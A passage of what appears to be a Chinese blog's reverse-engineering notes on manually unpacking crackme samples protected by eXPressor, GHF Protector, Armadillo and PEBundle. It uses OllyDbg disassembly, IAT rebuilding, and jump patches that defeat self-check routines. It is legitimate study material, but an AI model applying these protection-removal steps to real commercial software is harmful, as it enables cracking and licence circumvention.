plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">00408D09    55              push ebp</span><br><span class="line">00408D0A   /EB 01           jmp short UnPackMe.00408D0D</span><br><span class="line">00408D0C   |3D 8BECEB01     cmp eax,0x1EBEC8B</span><br><span class="line">00408D11    2F              das</span><br><span class="line">00408D12    6A FF           push -0x1</span><br><span class="line">00408D14    EB 01           jmp short UnPackMe.00408D17</span><br><span class="line">00408D16    0C 68           or al,0x68</span><br><span class="line">00408D18    8890 BF01812C   mov byte ptr ds:[eax+0x2C8101BF],dl</span><br><span class="line">00408D1E    24 88           and al,0x88</span><br><span class="line">00408D20    6B7F 01 68      imul edi,dword ptr ds:[edi+0x1],0x68</span><br><span class="line">00408D24    ed              in eax,dx</span><br><span class="line">00408D25    8824EE          mov byte ptr ds:[esi+ebp*8],ah</span><br><span class="line">00408D28    810424 998F1B12 add dword ptr ss:[esp],0x121B8F99</span><br><span class="line">00408D2F    64:A1 00000000  mov eax,dword ptr fs:[0]</span><br><span class="line">00408D35    EB 01           jmp short UnPackMe.00408D38</span><br><span class="line">00408D37    CE              into</span><br><span class="line">00408D38    50              push eax</span><br><span class="line">00408D39    EB 01           jmp short UnPackMe.00408D3C</span><br></pre></td></tr></table></figure><p>汇总一下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">00408D09    55              push ebp</span><br><span class="line">00408D0D    8BEC            mov ebp,esp</span><br><span class="line">00408D12    6A FF           push -0x1</span><br><span class="line">00408D17    68 8890BF01     push 0x1BF9088</span><br><span class="line">;00408D1C    812C24 886B7F01 sub dword ptr ss:[esp],0x17F6B88 这个在其他OEP好像没有，去掉(因为OEP不够内存)</span><br><span class="line">00408D23    68 ED8824EE     push 0xEE2488ED</span><br><span class="line">;00408D28    810424 998F1B12 add dword ptr ss:[esp],0x121B8F99 这个在其他OEP好像没有，去掉</span><br><span class="line">00408D2F    64:A1 00000000  mov eax,dword ptr fs:[0]</span><br><span class="line">00408D38    50              push eax</span><br><span class="line">00408D3C    64:8925 00000000     mov dword ptr fs:[0],esp</span><br><span class="line">00408D46    83EC 68              sub esp,0x68</span><br><span class="line">00408D4C    53                   push ebx</span><br><span class="line">00408D50    56                   push esi</span><br><span class="line">00408D54    57                   push edi</span><br><span class="line">00408D58    8965 E8              mov dword ptr ss:[ebp-0x18],esp</span><br><span class="line">00408D5E    33DB                 xor ebx,ebx</span><br><span class="line">00408D63    895D FC              mov dword ptr ss:[ebp-0x4],ebx</span><br><span class="line">00408D69    6A 02                push 0x2</span><br><span class="line">00408D6E    FF15 90214000        call dword ptr ds:[0x402190]             ; msvcrt.__set_app_type</span><br><span class="line">00408D77    59                   pop ecx</span><br><span class="line">00408D7B    830D 2C314000 FF     or dword ptr ds:[0x40312C],-0x1</span><br><span class="line">00408D85    830D 30314000 FF     or dword ptr ds:[0x403130],-0x1</span><br><span class="line">00408D8F    FF15 8C214000        call dword ptr ds:[0x40218C]             ; msvcrt.__p__fmode</span><br></pre></td></tr></table></figure><p>二进制代码汇总：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">55 8B EC 6A FF 68 88 90 BF 01 68 ED 88 24 EE 64 A1 00 00 00 00 50 64 89 25 00 00 00 00 83 EC 68 53 56 57 89 65 E8 33 DB 89 5D FC 6A 02 FF 15 90 21 40 00 59 83 0D 2C 31 40 00 FF 83 0D 30 31 40 00 FF FF 15 8C 21 40 00</span><br></pre></td></tr></table></figure><p>终于到达大跳转：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">00408D98  - E9 AB89FFFF          jmp UnPackMe.00401748</span><br></pre></td></tr></table></figure><p>FOEP：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">00401748    8B0D 20314000        mov ecx,dword ptr ds:[0x403120]</span><br><span class="line">0040174E    8908                 mov dword ptr ds:[eax],ecx</span><br><span class="line">00401750    FF15 88214000        call dword ptr ds:[0x402188]             ; msvcrt.__p__commode</span><br></pre></td></tr></table></figure><p>二进制粘贴到FOEP上方，将<code>401700</code>作为新EIP。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">00401700      55                 push ebp</span><br><span class="line">00401701      8BEC               mov ebp,esp</span><br><span class="line">00401703      6A FF              push -0x1</span><br><span class="line">00401705      68 8890BF01        push 0x1BF9088</span><br><span class="line">0040170A      68 ED8824EE        push 0xEE2488ED</span><br><span class="line">0040170F      64:A1 00000000     mov eax,dword ptr fs:[0]</span><br><span class="line">00401715      50                 push eax                                 ;  msvcrt._fmode</span><br><span class="line">00401716      64:8925 00000000   mov dword ptr fs:[0],esp</span><br><span class="line">0040171D      83EC 68            sub esp,0x68</span><br><span class="line">00401720      53                 push ebx</span><br><span class="line">00401721      56                 push esi</span><br><span class="line">00401722      57                 push edi</span><br><span class="line">00401723      8965 E8            mov dword ptr ss:[ebp-0x18],esp</span><br><span class="line">00401726      33DB               xor ebx,ebx</span><br><span class="line">00401728      895D FC            mov dword ptr ss:[ebp-0x4],ebx</span><br><span class="line">0040172B      6A 02              push 0x2</span><br><span class="line">0040172D      FF15 90214000      call dword ptr ds:[0x402190]             ;  msvcrt.__set_app_type</span><br><span class="line">00401733      59                 pop ecx                                  ;  005BFFD0</span><br><span class="line">00401734      830D 2C314000 FF   or dword ptr ds:[0x40312C],-0x1</span><br><span class="line">0040173B      830D 30314000 FF   or dword ptr ds:[0x403130],-0x1</span><br><span class="line">00401742      FF15 8C214000      call dword ptr ds:[0x40218C]             ;  msvcrt.__p__fmode</span><br><span class="line">00401748   .  8B0D 20314000      mov ecx,dword ptr ds:[0x403120]</span><br></pre></td></tr></table></figure><p>重建IAT用importREC不行，但用Scylla脱壳成功，程序正常运行。</p><h2 id="7-6-eXPressor-1-3-0-VB自校验处理"><a href="#7-6-eXPressor-1-3-0-VB自校验处理" class="headerlink" title="7.6 eXPressor 1.3.0(VB自校验处理)"></a>7.6 eXPressor 1.3.0(VB自校验处理)</h2><p>单步去到大跳转。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">00407D00  |.- FFE0          jmp eax                                  ;  UnPackMe.004012A0</span><br></pre></td></tr></table></figure><p>去到OEP。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0040129A  - FF25 AC104000   jmp dword ptr ds:[&lt;&amp;msvbvm60.#ThunRTMain_100&gt;]     ; msvbvm60.ThunRTMain</span><br><span class="line">004012A0 &gt;  68 582E4000     push dumped_.00402E58</span><br><span class="line">004012A5    E8 F0FFFFFF     call &lt;jmp.&amp;msvbvm60.#ThunRTMain_100&gt;</span><br></pre></td></tr></table></figure><p>脱壳后还是运行不了，因为本来就是要考自校验的问题。</p><p>将脱壳后的程序载入OD，在命令窗口输入<code>bpx papa</code>去到调用模块。</p><p>方法一：找到目标为<code>__vbaNew2</code>，<code>__vbaNew2</code>的功能是调用程序的子窗口或子函数。根据分析(？)，它调用了退出函数。</p><p>右键-&gt;在每个调用到<code>__vbaNew2</code>上设置断点。一个一个看。往上拉紧挨的cmp与跳转指令要格外关注，F4运行到<code>cmp</code>指令后，观察跳转指令是否绕过退出函数。绕过则不管它，没绕过将跳转实现。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">00403D2A    391D E0524000   cmp dword ptr ds:[0x4052E0],ebx</span><br><span class="line">00403D30    75 10           jnz short dumped_.00403D42;跳转实现，不管</span><br><span class="line">00403D32    68 E0524000     push dumped_.004052E0                                     ; ASCII &quot;d窝&quot;</span><br><span class="line">00403D37    68 2C384000     push dumped_.0040382C</span><br><span class="line">00403D3C    FF15 8C104000   call dword ptr ds:[&lt;&amp;msvbvm60.#__vbaNew2_340&gt;]            ; msvbvm60.__vbaNew2</span><br><span class="line">00403D42    8B35 E0524000   mov esi,dword ptr ds:[0x4052E0]</span><br></pre></td></tr></table></figure><p>看到有两个<code>cmp</code>与<code>jnz</code>组合，先F4、F8走一下看它是怎么运行的。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">00403F35    66:395D E4      cmp word ptr ss:[ebp-0x1C],bx</span><br><span class="line">00403F39    75 56           jnz short dumped_.00403F91;不实现</span><br><span class="line">00403F3B    391D E0524000   cmp dword ptr ds:[0x4052E0],ebx</span><br><span class="line">00403F41    75 10           jnz short dumped_.00403F53;实现</span><br><span class="line">00403F43    68 E0524000     push dumped_.004052E0                                     ; ASCII &quot;d窝&quot;</span><br><span class="line">00403F48    68 2C384000     push dumped_.0040382C</span><br><span class="line">00403F4D    FF15 8C104000   call dword ptr ds:[&lt;&amp;msvbvm60.#__vbaNew2_340&gt;]            ; msvbvm60.__vbaNew2</span><br></pre></td></tr></table></figure><p>如果jnz不修改，F9出现异常。如果jnz修改为jmp，F9程序正常终止。所以第一个<code>jnz</code>应该修改为<code>jmp</code>。</p><p>又来两个<code>cmp</code>与跳转指令结合</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">00404295    817D E4 C05D000&gt;cmp dword ptr ss:[ebp-0x1C],0x5DC0</span><br><span class="line">0040429C    7E 54           jle short dumped_.004042F2;不实现</span><br><span class="line">0040429E    391D E0524000   cmp dword ptr ds:[0x4052E0],ebx</span><br><span class="line">004042A4    75 10           jnz short dumped_.004042B6;实现</span><br><span class="line">004042A6    68 E0524000     push dumped_.004052E0                                     ; ASCII &quot;d窝&quot;</span><br><span class="line">004042AB    68 2C384000     push dumped_.0040382C</span><br><span class="line">004042B0    FF15 8C104000   call dword ptr ds:[&lt;&amp;msvbvm60.#__vbaNew2_340&gt;]            ; msvbvm60.__vbaNew2</span><br></pre></td></tr></table></figure><p>如果jnz不修改，F9出现正常终止。如果jnz修改为jmp，F9程序弹出主程序。所以<code>jle</code>应该修改为<code>jmp</code>。</p><p>因为已经可以出现主程序了，所以后面的调用可以不管它。保存两处修改，程序可以跑起来。</p><h2 id="7-7-delphi自效验的处理"><a href="#7-7-delphi自效验的处理" class="headerlink" title="7.7  delphi自效验的处理"></a>7.7  <strong>delphi自效验的处理</strong></h2><p>是FSG 2.0的壳，上面有说，不再赘述。在修复时，会发现只有3个指针，这种情况是不可能有的，所以要手动查找IAT指针。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0045273F    A1 E03F4500     mov eax,dword ptr ds:[0x453FE0]</span><br></pre></td></tr></table></figure><p>在窗口命令输入<code>d 453FE0</code>，发现全是程序函数还有ASCII码，不是我们要找的IAT指针。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">00453FE0  00455BB0  UnPackMe.00455BB0</span><br><span class="line">00453FE4  00453014  UnPackMe.00453014</span><br><span class="line">00453FE8  00407138  ASCII &quot;dVE&quot;</span><br><span class="line">00453FEC  0041ADD0  ASCII &quot;dVE&quot;</span><br></pre></td></tr></table></figure><p>往下滑啊滑啊(Zzz…)，终于来到IAT，起始地址<code>45612C</code>，末尾<code>456738</code>，大小<code>456738-45612C=60C</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">00456128  00000000</span><br><span class="line">0045612C  7C93135A  ntdll.RtlDeleteCriticalSection</span><br><span class="line">00456130  7C9210E0  ntdll.RtlLeaveCriticalSection</span><br></pre></td></tr></table></figure><p>脱壳后的程序没有弹出错误提示，双击“运行不了”的情况，大多数是程序有自校验的问题，它是运行了又退出了。</p><p>与7.6一样，在命令窗口输入<code>bp FindFirstFileA</code>（dll领空）下断避免后续程序跑飞。在命令窗口输入<code>bpx papa</code>，找到<code>EixtProcess</code>函数下断(因为7.6找不到这个函数，经过分析得出<code>__vbaNew2</code>调用退出函数)。</p><p>F9，运行到dll领空Alt+F9返回。再F9运行到达某个退出函数断点处。这是switch语句执行default时的代码。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">004523A6   &gt; \50            push eax                                 ;  Default case of switch 00451FB8</span><br><span class="line">004523A7   .  89D8          mov eax,ebx</span><br><span class="line">004523A9   .  29D8          sub eax,ebx</span><br><span class="line">004523AB   .  89C3          mov ebx,eax</span><br><span class="line">004523AD   .  89D8          mov eax,ebx</span><br><span class="line">004523AF   .  01D8          add eax,ebx</span><br><span class="line">004523B1   .  89C3          mov ebx,eax</span><br><span class="line">004523B3   .  58            pop eax</span><br><span class="line">004523B4   .  6A 00         push 0x0                                 ; /ExitCode = 0x0</span><br><span class="line">004523B6   .  E8 F540FBFF   call &lt;jmp.&amp;kernel32.#ExitProcess_183&gt;    ; \ExitProcess</span><br></pre></td></tr></table></figure><p>上下找一下发现只有<code>case 2E4E9</code>没有退出函数。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">004523BB   &gt; \33C0          xor eax,eax                              ;  Case 2E4E9 of switch 00451FB8</span><br></pre></td></tr></table></figure><p>这个地址跳转来自很多，但只有一个是条件跳转<code>0045208C</code>，往上看在<code>00452085</code>下断点，重载运行几下运行发现可以停在这里。jg不要实现，因为我们想在je跳转。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">00452085   &gt; \3D E9E40200   cmp eax,0x2E4E9</span><br><span class="line">0045208A   .  7F 6A         jg short dumped_.004520F6</span><br><span class="line">0045208C   .  0F84 29030000 je dumped_.004523BB</span><br></pre></td></tr></table></figure><p>修改一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0045208A      90            nop</span><br><span class="line">0045208B      90            nop</span><br><span class="line">0045208C      E9 2A030000   jmp dumped_.004523BB</span><br></pre></td></tr></table></figure><p>一路F8，在这又遇到了<code>2E4E9</code>，运行到jnz实现了，按道理它实现就不让它实现，nop掉。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">00452775  |.  3D E9E40200   cmp eax,0x2E4E9</span><br><span class="line">0045277A  |.  75 0C         jnz short dumped_.00452788</span><br></pre></td></tr></table></figure><p>一路F8，又遇到了<code>2E4E9</code>，je要改为jmp，要不然就退出了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">00452419  |.  3D E9E40200   cmp eax,0x2E4E9</span><br><span class="line">0045241E  |.  74 07         je short dumped_.00452427</span><br><span class="line">00452420  |.  6A 00         push 0x0                                 ; /ExitCode = 0x0</span><br><span class="line">00452422  |.  E8 8940FBFF   call &lt;jmp.&amp;kernel32.#ExitProcess_183&gt;    ; \ExitProcess</span><br><span class="line">00452427  |&gt;  33C0          xor eax,eax</span><br></pre></td></tr></table></figure><p>修改完这3处，程序正常运行。结果OD不能选择所有修改(我的原因)，那就修改一处保存一次重载新程序一次。</p><h2 id="7-8-GHF-Protector-V1-0"><a href="#7-8-GHF-Protector-V1-0" class="headerlink" title="7.8 GHF Protector V1.0"></a>7.8 GHF Protector V1.0</h2><p>脱壳的最佳时机：手动脱壳理想的最佳dump时机是指壳已经把程序代码包括资源等数据全部解密、输入表等数据还原但未填充系统函数地址、dll还没重定位，此时dump出来的文件只需修正OEP、ImportTableRVA等信息即可正常运行完成脱壳。</p><p>PEID查壳说是ASProtect 1.32的壳，但载入OD的壳特征明显不是ASProtect，并且程序的图标也被隐藏了。题目给了这是GHF Protector V1.0的壳。(可能不同程序入口代码不同)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">00511709 &gt;  50              push eax</span><br><span class="line">0051170A    7C 05           jl short UnPackMe.00511711</span><br><span class="line">0051170C    52              push edx                                 ; ntdll.KiFastSystemCallRet</span><br><span class="line">0051170D    c1c4 80         rol esp,0x80</span><br><span class="line">00511710    5A              pop edx                                  ; kernel32.7C817077</span><br><span class="line">00511711    58              pop eax                                  ; kernel32.7C817077</span><br></pre></td></tr></table></figure><h3 id="7-8-1-最佳脱壳时机"><a href="#7-8-1-最佳脱壳时机" class="headerlink" title="7.8.1 最佳脱壳时机"></a>7.8.1 最佳脱壳时机</h3><p>在<code>M</code>模块，<code>.idata</code>下断，Shift+F9运行，F7、F8走到这，这里是最佳的脱壳时机。算是这个壳的一个特征，三个跳转指令，且有<code>0x80000000</code>和<code>0x7FFFFFFF</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">005114A2   /74 2A           je short UnPackMe.005114CE</span><br><span class="line">005114A4   |F7C2 00000080   test edx,0x80000000</span><br><span class="line">005114AA   |74 08           je short UnPackMe.005114B4</span><br><span class="line">005114AC   |81E2 FFFFFF7F   and edx,0x7FFFFFFF</span><br><span class="line">005114B2   |EB 04           jmp short UnPackMe.005114B8</span><br></pre></td></tr></table></figure><p>用PEtools半脱壳，设置PEtools选项：</p><img src="/posts/e2d652c5/GHF_PEtools.jpg" class="" title="GHF_PEtools"><p>或者用LoadPE半脱壳，在选项设置一下：</p><img src="/posts/e2d652c5/GHF_PE%E8%AE%BE%E7%BD%AE.png" class="" title="GHF_PE设置"><p>不要修正镜像大小，否则不能抓取进程。程序正常运行，但壳还没脱干净。</p><p>再将半脱壳后的程序载入OD，用ESP定律找到OEP。LoadPE脱壳，还原默认设置。</p><img src="/posts/e2d652c5/PE%E9%BB%98%E8%AE%A4.png" class="" title="PE默认"><p>importREC重建IAT，脱壳成功。</p><h3 id="7-8-2-使用LoadLibraryA"><a href="#7-8-2-使用LoadLibraryA" class="headerlink" title="7.8.2 使用LoadLibraryA"></a>7.8.2 使用LoadLibraryA</h3><p>在命令窗口输入<code>bp LoadLibraryA</code>回车，Shift+F9运行8次后，Alt+F9返回，取消断点，单步跟踪。(不知道为什么是8次)</p><p>到达这里，edx=00401700，是一个大跳转。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0040729F  ^\FFE2            jmp edx</span><br></pre></td></tr></table></figure><p>F8到达OEP。</p><p>用LoadPE，按7.8.1设置PE选项，程序可以运行，但壳还没脱干净，重建IAT即可。如果按PE默认，PEID显示这不是一个有效的PE文件。</p><p>或者用PEtools，按如下设置，重建IAT就可成功运行。</p><img src="/posts/e2d652c5/GHF_PEtools.jpg" class="" title="GHF_PEtools"><h3 id="7-8-3-使用GlobalFree"><a href="#7-8-3-使用GlobalFree" class="headerlink" title="7.8.3 使用GlobalFree"></a>7.8.3 使用GlobalFree</h3><p>在命令窗口输入<code>bp GlobalFree</code>回车，Shift+F9，再Alt+F9，取消断点，单步跟踪也能去到OEP。</p><h2 id="7-9-Armadillo-穿山甲-6-04"><a href="#7-9-Armadillo-穿山甲-6-04" class="headerlink" title="7.9 Armadillo(穿山甲) 6.04"></a>7.9 Armadillo(穿山甲) 6.04</h2><p>穿山甲需要处理Magic jump，都有IAT加密。</p><h3 id="7-9-1-使用GetModuleHandleA-9-5"><a href="#7-9-1-使用GetModuleHandleA-9-5" class="headerlink" title="7.9.1 使用GetModuleHandleA+9/+5"></a>7.9.1 使用GetModuleHandleA+9/+5</h3><p>忽略所有异常，在StrongOD中勾选“跳过某些异常”。在命令窗口输入<code>bp GetModuleHandleA+9</code>下断，Shift+F9运行N次，直到堆栈窗口出现：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">001293E4 /0012EB40</span><br><span class="line">001293E8 |00B88683 RETURN to 00B88683 from kernel32.GetModuleHandleA</span><br><span class="line">001293EC |00BB514C ASCII &quot;kernel32.dll&quot;</span><br><span class="line">001293F0 |00BB6D64 ASCII &quot;VirtualFree&quot;</span><br><span class="line">001293F4 |0EF6D207</span><br><span class="line">001293F8 |00454380 UnPackMe.00454380</span><br></pre></td></tr></table></figure><p>再Shift+F9一次，Alt+F9返回，单步到Magic Jump，将它nop掉。(我也不知道为什么这里是Magic Jump)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">00B6AA13   /75 05           jnz short 00B6AA1A;nop</span><br></pre></td></tr></table></figure><p>往下拉到这里，F4运行到此处，再撤销刚才对Magic Jump的修改。因为穿山甲会检测某种保护下壳的完整性。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">00B6AC9A   /EB 03           jmp short 00B6AC9F</span><br></pre></td></tr></table></figure><p>接着再下第二个断点<code>bp CreateThread</code>，Shift+F9运行。再Alt+F9返回。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">00B7614C    50              push eax</span><br><span class="line">00B7614D    FF15 9032BB00   call dword ptr ds:[0xBB3290]             ; kernel32.CloseHandle</span><br><span class="line">00B76153    5E              pop esi                                  ; UnPackMe.00454380</span><br></pre></td></tr></table></figure><p>单步跟踪到这，F7进入即可到达OEP。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">00B930E5    FFD2            call edx                                 ; UnPackMe.00401700</span><br></pre></td></tr></table></figure><p>或者不下第二个断点，在<code>M</code>模块的<code>.text</code>下断运行，单步跟踪到上面指令再F7进入OEP。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">00401700    55              push ebp</span><br><span class="line">00401701    8BEC            mov ebp,esp</span><br><span class="line">00401703    6A FF           push -0x1</span><br><span class="line">00401705    68 00254000     push UnPackMe.00402500</span><br><span class="line">0040170A    68 86184000     push UnPackMe.00401886</span><br></pre></td></tr></table></figure><p>常规脱壳即可。</p><h3 id="7-9-2-使用VirtualProtect"><a href="#7-9-2-使用VirtualProtect" class="headerlink" title="7.9.2 使用VirtualProtect"></a>7.9.2 使用VirtualProtect</h3><p>在命令窗口输入<code>bp VirtualProtect</code>，处理IAT加密。Shift+F9，注意寄存器ecx。当运行到ecx=00401000时，Alt+F9返回，取消断点。右键-&gt;查找-&gt;命令(Ctrl+F)，输入<code>push 100</code>，勾选“整个块”来到这里。(不勾选会找错地址，血的教训！)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">00B42EC0    55              push ebp;修改为retn</span><br><span class="line">00B42EC1    8BEC            mov ebp,esp</span><br><span class="line">00B42EC3    83EC 2C         sub esp,0x2C</span><br><span class="line">00B42EC6    833D 20F6BB00 0&gt;cmp dword ptr ds:[0xBBF620],0x0</span><br><span class="line">00B42ECD    75 59           jnz short 00B42F28</span><br><span class="line">00B42ECF    C745 EC 13004BB&gt;mov dword ptr ss:[ebp-0x14],0xBA4B0013</span><br><span class="line">00B42ED6    68 00010000     push 0x100</span><br></pre></td></tr></table></figure><p>将第1行代码修改为<code>retn</code>，因为下面的代码是执行加密。</p><p>之后再下断点<code>bp CreateThread</code>或者去到<code>M</code>模块<code>.text</code>下断运行，单步跟踪同样去到OEP。 </p><h2 id="7-10-Armadillo-4-40"><a href="#7-10-Armadillo-4-40" class="headerlink" title="7.10 Armadillo 4.40"></a>7.10 Armadillo 4.40</h2><p>脱壳方法同7.9.1，<code>LoadLibraryA</code>下面的跳转就是magic jump？将它修改为<code>jmp</code>(什么时候修改为nop什么时候修改为nop？看它是否跳转？)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">00AB5FE3    FF15 BC62AD00   call dword ptr ds:[0xAD62BC]             ; kernel32.LoadLibraryA</span><br><span class="line">00AB5FE9    8B0D AC40AE00   mov ecx,dword ptr ds:[0xAE40AC]</span><br><span class="line">00AB5FEF    89040E          mov dword ptr ds:[esi+ecx],eax</span><br><span class="line">00AB5FF2    A1 AC40AE00     mov eax,dword ptr ds:[0xAE40AC]</span><br><span class="line">00AB5FF7    391C06          cmp dword ptr ds:[esi+eax],ebx</span><br><span class="line">00AB5FFA    0F84 2F010000   je 00AB612F</span><br></pre></td></tr></table></figure><p>之后同7.9.1</p><p>用7.9.2方法好像不太可。</p><h2 id="7-11-PEBundle-2-0b5-3-0x"><a href="#7-11-PEBundle-2-0b5-3-0x" class="headerlink" title="7.11 PEBundle 2.0b5 - 3.0x"></a>7.11 PEBundle 2.0b5 - 3.0x</h2><p>用ESP定律找到OEP。脱壳后运行不了，但查壳没壳。考虑是importREC重建IAT时那些被我们剪切掉的指针是有用的，壳将它们加密了让我们以为那些指针没用。</p><p>随便找一个无效指针偏移地址为<code>5517C</code>，在OD重载，命令窗口输入<code>d 45517C</code>，在它上面一行(有效指针)下硬件访问断点。F8几下跑飞，但被我们下的硬件断点截住了。断点上面的地址已经出现系统函数。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0045516C  7C8101B1  kernel32.lstrcpynA</span><br><span class="line">00455170  7C801D53  kernel32.LoadLibraryExA</span><br><span class="line">00455174  7C80A4B5  kernel32.GetThreadLocale</span><br><span class="line">00455178  0005589E</span><br><span class="line">0045517C  000558B0</span><br></pre></td></tr></table></figure><p>F8走几下，发现这里是一个循环，并且<code>45517C</code>被加密。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">00471E14    8B19            mov ebx,dword ptr ds:[ecx]</span><br><span class="line">00471E16    83C1 04         add ecx,0x4</span><br><span 